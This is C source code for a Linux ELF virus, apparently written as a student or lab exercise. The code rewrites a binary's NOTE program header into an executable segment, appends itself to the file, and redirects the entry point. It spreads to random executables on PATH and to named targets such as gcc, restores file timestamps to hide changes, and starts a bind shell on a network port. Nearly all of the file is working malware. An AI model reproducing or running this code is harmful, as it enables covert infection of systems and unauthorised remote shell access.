/*
 * This file implements a virus to infect ELF binaries on 
 * 64-bit x86 GNU/linux machines. The virus will spread 
 * itself to other binaries, and will create a shell binded
 * to certain port. Infection progress is logged in /tmp/.infection-progress.
 * Infected ELFs will be logged in /tmp/.infection-log 
 */
 
#include "syscall_64.h"
#include <elf.h>
 
/*
 * Virus parameters.
 */

//#define BERBOSE_OUTPUT

#define IO_BUFFER_SIZZ			4096
#define PATH_SIZE				1024
#define PATH_LIST_SIZE			32
#define PATH_LIST_ENTRY_SIZE	64
#define EXEC_SIZE				64

#define VICTIM		10
#define ATTEMPTS	100

 /*
  * Constants
  */
  
#define INFECTION_OK			 0
#define INFECTION_IMPOSSIBLE	-1
#define INFECTION_ALREADY_DONE  -2
#define INFECTION_FAILED		-3

#define ELF_MAGIC 0x464C457F

/*
* Used for virus size calculation
*/

#define FIRST_FUNC read_buf
#define LAST_FUNC main
int main(int argc, char** argv);
#define NOINLINE __attribute__((used,noinline))

/*
* Place null-terminated string 'str' in the code itself, and return a 
* pointer to it.
*/
   
#define STR(str) \
({char* var=0; \
  asm volatile("  call after_string%=\n" \
			   "  .ascii \""str"\"\n" \
			   "  .byte 0\n" \
			   "after_string%=:\n" \
			   "  pop %0\n" \
			   : "=m" (var) ); \
var; }) 

/*
 * Read 'buf_size' bytes from file 'fd' into 'buf', and return the
 * number of bytes writtrn to 'buf'.
 */
static NOINLINE int read_buf(int fd, void* buf, int buf_size){
	int bytes_read = 0, total_bytes = 0;
	do{ 
	  bytes_read = read(fd, buf+total_bytes, buf_size-total_bytes);
	  if(bytes_read<=0)break;
	  total_bytes += bytes_read;
	}
	while(total_bytes<buf_size);
    return total_bytes;	
}	 

/*
 * Write 'buf_size' bytes to file 'fd' from 'buf', and return the
 * number of bytes written to 'fd'.
 */
static NOINLINE int write_buf(int fd, void const* buf, int buf_size){
int bytes_written = 0, total_bytes = 0;
 do { 
   bytes_written = write(fd,buf+total_bytes,buf_size-total_bytes );
   if (bytes_written <= 0) break;
   total_bytes += bytes_written;
 }
 while(total_bytes < buf_size);
 return total_bytes;
}

/*
 * Return length of null-terminated string 'str'.
 */
static NOINLINE int string_length(char const* str)
{
 int length;
 for (length = 0; str[length] != '\0'; length++);
 return length;
}
  
/*
 * Add content of 'src' to 'dest' at 'offset'	  
 */
static NOINLINE void string_append(char* dest, char const* src, int offset)       //**add src[n] to dest[offset+n]
{
 int i;
 for(i=0;;i++)
 {
	 dest[offset+i] = src[i];
	 if(!src[i]) break;
 }
}

/*
 * Extract the environment variable 'name' from /proc/self/environment
 * and put it into 'content'.
 * NOTE: 'name' should end with an '='.
 */
 static NOINLINE int get_env_var(char *name, char *content, int content_size)
 {
	char buf[IO_BUFFER_SIZZ];
	int fd;
	ssize_t n;
	int i = 0, j = 0, k = 0;
	int nb_start = 1;
	int name_length = string_length(name);
	
	if ((fd = open(STR("/proc/self/environ"), O_RDONLY, 0))<0)
		return 0;
	
	do
	{
	  n = read_buf(fd, buf, IO_BUFFER_SIZZ);
	  for (i = 0; i < n; ++i)
	  {
		  if (nb_start)
		  {
			  if (k != name_length)
			  {
				  if (buf[i] == name[k])
				  {
					  k++;
				  }
				  else
				  {
					  k = 0;
					  nb_start = 0;
				  }
			  }
			  else if (j < content_size-1)
			  {
				if (buf[i] == '\0') goto out;
				content[j++] = buf[i];
			  }
			  else
			  {
				  goto out;
			  }
		  }
		  else if (buf[i] == '\0')
		  {
			  nb_start = 1;
		  }
	  }
	}
	while (n);
	
  out:
   content[j] = '\0';
   close(fd);
   return (content[0] != '\0');
} 

/*
 * Split the Path environmental variable in 'path' ("entry:...:entry")
 * into an array of entries 'list'. Return the number of entries.
 */
static NOINLINE int split_paths(char *path, 
                               char list[PATH_LIST_SIZE][PATH_LIST_ENTRY_SIZE])
{
	int entry = 0, i = 0;
	char* p;
	for (p=path;;p++)
	{
		if(*p && *p != ':')
		{
			list[entry][i++]=*p;
			if (i == PATH_LIST_ENTRY_SIZE) /* entry too large, skip it*/
			{
				i=0;
				while (*p && *p != ':')p++;
			}
		}
		else
		{
			if (i == 0)/* empty entry means current directory */
				list[entry][i++]='.';
			list[entry++][i]='\0';
			i=0;
			if (*p == '\0' || entry == PATH_LIST_SIZE)
				break;
		}
	}
	return entry;
}

/*
 * Return a random number 'r', s.t. 0<= 'r' < 'ubound', using /dev/urandom
 */
static NOINLINE int gen_random(int ubound)
{
	int fd;
	unsigned int rand;
	
	if ((fd = open(STR("/dev/urandom"), O_RDONLY, 0)) >= 0)
	{
		read_buf(fd, &rand, sizeof(rand));
		close(fd);
	}
	return rand % ubound;
}

/*
 * Return the number of entries in the directory 'dir'.
 */
 static NOINLINE int nr_of_directory_entries(char *dir)
 {
	 unsigned char buf[IO_BUFFER_SIZZ];
	 struct dirent* e;
	 int fd, ctr = 0, read, j;
	 if((fd = open(dir, O_RDONLY, 0)) >= 0)
	 {
		 while((read=getdents(fd,buf,sizeof(buf))) > 0)
		 {
			 for(j = 0; j < read; j += e->d_reclen)
			 {
				 e = (struct dirent*)(&buf[j]);
				 ctr++;
			 }
		 }
		 close(fd);
	 }
	 return ctr;
 }

/*
 * Return the number of entries in the directory 'dir' into 'entry'.
 */
static NOINLINE int directory_entry(char *dir, int i, struct dirent* entry)
{
	unsigned char buf[IO_BUFFER_SIZZ];
	struct dirent *e;
	int fd, ctr = 0, success = 0, read, j;
	if ((fd = open(dir, O_RDONLY, 0)) >= 0)
	{
		while ((read = getdents(fd, buf, sizeof(buf))) > 0)
		{
			for (j = 0; j < read; j += e->d_reclen)
			{
				e = (struct dirent*)(&buf[j]);
				 if (ctr == i){
					 success = 1;
					 entry->d_ino = e->d_ino;
					 entry->d_off = e->d_off;
					 entry->d_reclen = e->d_reclen;
					 string_append(entry->d_name, &(e->d_name[-1]), 0);
					 goto close_and_return;
				 }
				 ctr++;
			}
		}
	close_and_return:
		close(fd);
	}
	return success;
}

/*
 * Write the integer 'val' as decimal to the file opened as 'fd'.
 */
static NOINLINE int write_int(int fd, unsigned int val){								//**change the num of process to char
	char buf[11] = {0};
	
	int i = 10;
	for(; val && i; --i, val /= 10)
		buf[i] = STR("0123456789")[val % 10];
	
	return write_buf(fd, &buf[i+1], 10-i);
}

/*
 * Keep track of the virus's spread. The parameters are (upto) 3 string.
 */
static NOINLINE void log_progress(char const* prefix, char const* filename,
								  char const* suffix)
{
	int fd = open(STR("/tmp/.infection-progress"), O_WRONLY|O_APPEND|O_CREAT, 0666);
	if (fd < 0) return;
	write_int(fd, getpid());
	write_buf(fd, STR(":_"),2);
	if (prefix) write_buf(fd, prefix, string_length(prefix));
	if (filename) write_buf(fd, filename, string_length(filename));
	if (suffix) write_buf(fd, suffix, string_length(suffix));
	close(fd);
}
#ifdef VERBOSE_OUTPUT
#	define log_verbose_progress(...) log_progress(__VA_ARGS__)
#else
#	define log_verbose_progress(...)
#endif

/*
 * Infect the file pointed to by 'fd' with the virus code 'payload' of
 * size 'payload_size'. (The entry point of the virus code is 
 * 'code_offset' bytes from the start of the code.)
 */
static NOINLINE int infect_ELF(int fd, char const* payload, int payload_size,					//**virus_start_addr, virus_size,virus_code_offset
								int code_offset)
{
	Elf64_Ehdr ehdr;																			
	Elf64_Phdr phdr;
	int bytes_read, bytes_written;
	unsigned int i;
	unsigned int payload_address = 0;
	unsigned int payload_offset = 0;
	int adjustment;
	
	// Check to see that the file is actually a 32-bit x86 ELF binary.
	log_verbose_progress(STR("__.._reading_ELF_header...\\n"),0,0);
	
	bytes_read = read_buf(fd, &ehdr, sizeof(Elf64_Ehdr));
	if(bytes_read != sizeof(Elf64_Ehdr))
		return INFECTION_FAILED;
	
	if ((*(int*)&ehdr.e_ident) != ELF_MAGIC ||
		ehdr.e_machine != EM_X86_64 ||
		ehdr.e_ident[EI_CLASS] != ELFCLASS64)
	{
		return INFECTION_IMPOSSIBLE;
	}
	
	//construct the little bit of trampoline code before actual virus.
	char pre_payload[]={
		'\x50','\x53','\x51','\x52','\x56','\x57', //push eax,ebx,ecx,edx,esi,edi
		'\xE8','.','.','.','.',					   //call 'the_virus' function
		'\x5F','\x5E','\x5A','\x59','\x5B','\x58', //pop edi,esi,edx,ecx,ebx,eax
		'\xE9','.','.','.','.'					   //jump to the old entry point
	};
	int pre_payload_size = sizeof(pre_payload)/sizeof(pre_payload[0]);		
	int* pre_payload_code_offset = (int*)(pre_payload+7);										//**second line of pre_payload
	Elf32_Addr* pre_payload_old_entry_point = (Elf32_Addr*)(pre_payload + 18);					//**forth line of pre_payload
	Elf32_Addr  old_entry_point = ehdr.e_entry;
	
	//look for the NOTE program header which we will hijack for our
	//virus code.
	log_verbose_progress(STR("__.._reading_program_headers...\\n"),0,0);
	int found_note_segment = 0;
	int num_load_segments = 0;
	if (lseek(fd, ehdr.e_phoff, SEEK_SET) < 0)
		return INFECTION_FAILED;
	for (i = 0; i < ehdr.e_phnum; ++i)													//**检索程序头目个数
	{
		bytes_read = read_buf(fd, &phdr, sizeof(Elf64_Phdr));							//**因为读写位置会随着每次读写而向后移，因此不需要转移光标操作
		if(bytes_read != sizeof(Elf64_Phdr))
			return INFECTION_FAILED;
		
		if (phdr.p_type == PT_LOAD){
			num_load_segments++;														//**check how much the LOAD segment is
		}
		else if (phdr.p_type == PT_NOTE){
			log_verbose_progress(STR("__.._found_NOTE_program_header,_"),
								 STR("attempting_to_overwrite...\\n"),0);
			
			found_note_segment = 1;
			
			//Compute the in-memory address the virus will get in the 
			//binary being infected. We place it before any of the other
			//code in the binary, at an address having the same 4KiB
			//alignment as the code has in the file.
			phdr.p_offset = payload_offset = lseek(fd, 0, SEEK_END);					//**place the segment in the end of the file	*
			payload_address = 0x0000000000400000 - (payload_size+pre_payload_size);
			adjustment = payload_offset % 0x1000 - payload_address % 0x1000;			
			if (adjustment > 0)payload_address -= 0x1000;								
			payload_address += adjustment;
			ehdr.e_entry = payload_address;												//**executable segment entry
			
			phdr.p_type = PT_LOAD;														//**change the type of the segment				*
			phdr.p_vaddr = phdr.p_paddr = payload_address;								//**映射到的虚存位置							*
			phdr.p_filesz = phdr.p_memsz = payload_size + pre_payload_size;				//**change the segment size in mem				*
			phdr.p_flags = PF_R|PF_X;													//**read and executable							*
			phdr.p_align = 0x1000;														//**4KB page size								*
			
			if (lseek(fd, ehdr.e_phoff + i*ehdr.e_phentsize, SEEK_SET) < 0)				//**将光标移向NOTE								*
				return INFECTION_FAILED;
			bytes_written = write_buf(fd, &phdr, sizeof(Elf64_Phdr));					//**change the NOTE to our LOAD					*
			if(bytes_written != sizeof(Elf64_Phdr))
				return INFECTION_FAILED;
			if (lseek(fd, 0, SEEK_SET) < 0)												//**将光标移向SEEK_SET							*
				return INFECTION_FAILED;
			bytes_written = write_buf(fd, &ehdr, sizeof(Elf64_Ehdr));					//**change the e_entry							*
			if(bytes_written != sizeof(Elf64_Ehdr))
				return INFECTION_FAILED;
		}
	}
	
	if(!found_note_segment)
		return (num_load_segments > 2) ? INFECTION_ALREADY_DONE : INFECTION_IMPOSSIBLE;
	
	// Prefix the virus code with a little trampoline that stores all
	// register values, calls the virus code, restores the register 
	// values, and then jumps to whatever the starting point of the 
	// original program was.
	log_verbose_progress(STR("__.._writing_pre_payload...\\n"),0,0);
	
	*pre_payload_code_offset = code_offset + (pre_payload_size - 11);								
	*pre_payload_old_entry_point = old_entry_point - (payload_address + pre_payload_size);			
	if(lseek(fd, payload_offset, SEEK_SET) < 0)														//**set the cursor to SEEK_SET+SEEK_END...(payload_offset=SEEK_END)
		return INFECTION_FAILED;
	bytes_written = write_buf(fd, pre_payload, pre_payload_size);									//**write pre_payload to the end of file
	if(bytes_written != pre_payload_size)
		return INFECTION_FAILED;
	
	// Write the actual virus to the end of the file.
	log_verbose_progress(STR("__._writing_payload...\\n"),0,0);
	
	bytes_written = write_buf(fd, payload, payload_size);											//**write payload to the end of file
	
	//save old entry point
	int fd_antidote = open(STR("/tmp/.infection-log"), O_WRONLY|O_APPEND|O_CREAT, 0666);
	if (fd_antidote < 0) return INFECTION_FAILED;
	write_int(fd_antidote , old_entry_point);
	write_buf(fd_antidote, STR("\\n" ), 1);
	close(fd_antidote);
	
	//Done
	return INFECTION_OK;
}

/*
 * The ViRuS c0d3
 */
static NOINLINE int the_virus() {
	/*
	first to launch the socket
	*/
	int sock, cli;
	struct sockaddr_in serv_addr;

	serv_addr.sin_family  = 2;
	serv_addr.sin_addr = 0;
	serv_addr.sin_port = 0xAAAA;
	//char *shell[2];
	//shell[0]=STR("/bin/sh");
	//shell[1]=0;

	pid_t fpid;

	fpid=fork();

	if(fpid==0){
	sock = socket(2, 1, 0);
	bind(sock, (struct sockaddr *)&serv_addr, 0x10);
	listen(sock, 1);
	cli = accept(sock, 0, 0);
	dup2(cli, 0);
	dup2(cli, 1);
	dup2(cli, 2);
	execve(STR("/bin/sh"), 0, 0);
	}
	/*
	now begin the elf infection
	*/
	void* virus_start_addr = 0;
	int virus_code_offset = 0;
	int virus_size=(void*)&LAST_FUNC-(void*)&FIRST_FUNC;
 
	log_verbose_progress(STR("Start!\\n") , 0 , 0);
 
	char self[PATH_SIZE];
	if(get_env_var(STR("_="),self,sizeof(self)))
		log_progress(STR("'"), self, STR(" '_reporting_for_duty.\\n"));
	else
		log_progress(STR("unknown_executable_reporting_for_duty.\\n"),0,0);
	
marker:
	asm volatile( "  call current_address\n"
				  "current_address:\n"
				  "  pop %0\n"
				: "=m" (virus_start_addr));
	// At this point ‘ virus start addr ‘ contains the address of the POP
	// instruction above . Subtracting 5 puts us before the CALL
	// instruction , ie at the ‘marker : ‘ label . If we then subtract the
	// difference between the address of the marker and that of the
	// f i r s t function , we have the address at which our code starts in
	// memory.
	virus_start_addr = (virus_start_addr - 5) - (&&marker - (void*)&FIRST_FUNC);
	
	// When we jump into the virus we want to hit the function
	// ‘ the virus ‘ , so we compute its location relative to the start of
	// the f i r s t of the virus ’ s functions in memory.
	virus_code_offset = (void*)&the_virus - (void*)&FIRST_FUNC;
	
	// Get the PATH environment variable from /proc/ s e l f /environ .
	char path[PATH_SIZE];
	if (!get_env_var(STR("PATH="), path, sizeof(path))){
		log_progress(STR("__Couldn't_read_PARH._Aborting.\\n"),0,0);
		goto virus_end;
	}
	log_verbose_progress(STR("PATH:_"), path, STR("\\n"));
	
	// Extract paths from PATH environment variable .
	char path_list[PATH_LIST_SIZE][PATH_LIST_ENTRY_SIZE];
	int pn = split_paths(path, path_list);
	
	//Get the number of entries in each PATH entry.
	int path_size[PATH_LIST_SIZE];
	int sum = 0;
	int i;
	for(i = 0; i < pn; i++)
	{
		path_size[i] = nr_of_directory_entries(path_list[i]);
		sum = sum + path_size[i];
	}
	if((sum == 0))
	{
		log_progress(STR("__No_binaries_in_PATH_to_infect._Aborting.\\n"),0,0);
		goto virus_end;
	}
	
	// Try to infect ‘VICTIMS‘ ELF binaries ( but stop after ‘ATTEMPTS‘
	// infection attempts ).
	int success = 0, tries = 0;
	char victim_pathname[EXEC_SIZE];
	int victim_important = 1;
	int victim_imp_num = 5;
	char imp_victim1[] = "/home/gina/Desktop/getkb1";
	char imp_victim2[] = "/usr/bin/gcc";
	i = 1;
	while (success < VICTIM && tries < ATTEMPTS)
	{
		// Generate a random pathname to a possible executable .
		int r = gen_random(sum);
		int ctr = 0;
		
		if(victim_important)
		{
			switch(i){
				case 1:
					string_append(victim_pathname, imp_victim1, 0);
					break;
				default: 
					string_append(victim_pathname, imp_victim2, 0);
					victim_important = 0;
					break;
			}
			i++;
		}
		else
		{
			for(i = 0; i < pn; i++)
			{
				if(ctr + path_size[i] > r)
				{
					struct dirent d;
					if(!directory_entry(path_list[i], r - ctr, &d))
						goto another_try;
					int path_length = string_length(path_list[i]);
					int file_length = string_length(d.d_name);
					int j;
					for(j = 0;j < EXEC_SIZE; j++)
					{
						victim_pathname[j] = '\0';
					}
					if (path_length + file_length + 2 <= EXEC_SIZE)
					{
						string_append(victim_pathname, path_list[i], 0);				//**NOT the location of inserting
						victim_pathname[path_length] = '/';
						string_append(victim_pathname, d.d_name, path_length + 1);
					}
					break;
				}
				else
				{
					ctr = ctr +path_size[i];
				}
			}
		}
		
		// Backup access and modify times .
		struct stat old_info;
		int stat_valid = (stat(victim_pathname,&old_info)==0);
		
		//Try to infect the (Potential) executable in 'victim_pathname'.			//**insert the code
		log_progress(STR("__Trying_to_infect_'"),victim_pathname,STR(",\\n"));
		int fd = open(victim_pathname, O_RDWR, 0);									//**use syscall open()
		if(fd >= 0)
		{
			int infection_result = infect_ELF(fd, virus_start_addr, virus_size,
											  virus_code_offset);
			close(fd);
			
			//Restore access and modify times(can't do change time, unfortunately)
			if (stat_valid)
			{
				struct timeval times[2];
				times[0].tv_sec = old_info.st_atime;
				times[0].tv_usec = old_info.st_atime_nsec / 1000;
				times[1].tv_sec = old_info.st_mtime;
				times[1].tv_usec = old_info.st_mtime_nsec /1000;
				utimes( victim_pathname, times );
			}
			
			switch ( infection_result ) {
			case INFECTION_OK:
				success++;
				log_progress(STR("__Succesfully_infected_’"), victim_pathname, STR(" ’\\n" ));
					
				int fd_antidote = open(STR("/tmp/.infection-log"), O_WRONLY|O_APPEND|O_CREAT, 0666);
				if (fd_antidote < 0) break;
				write_buf(fd_antidote, victim_pathname, string_length(victim_pathname));
				write_buf(fd_antidote, STR("\\n" ), 1);
				close(fd_antidote);
				break ;
			case INFECTION_IMPOSSIBLE:
				log_progress(STR("__Can’t_infect_’"), victim_pathname, STR(" ’.\\n" ));
				break ;
			case INFECTION_ALREADY_DONE:
				log_progress(STR("__Already_infected_’"), victim_pathname, STR(" ’.\\n" ));
				break ;
			default :
				log_progress(STR("__Failed_to_infect_’") , victim_pathname, STR(" ’.\\n" ));
				break ;
			}
		}
		else{
			log_progress(STR("__Can’t_open_’") , victim_pathname , STR(" ’_for_infection.\\n" ));
		}
	
	another_try:
		tries++;
	}

virus_end:
	log_verbose_progress(STR("Finished!\\n"),0,0);
	return 0;
}

int main(int argc, char** argv)
{
	return the_virus();
}

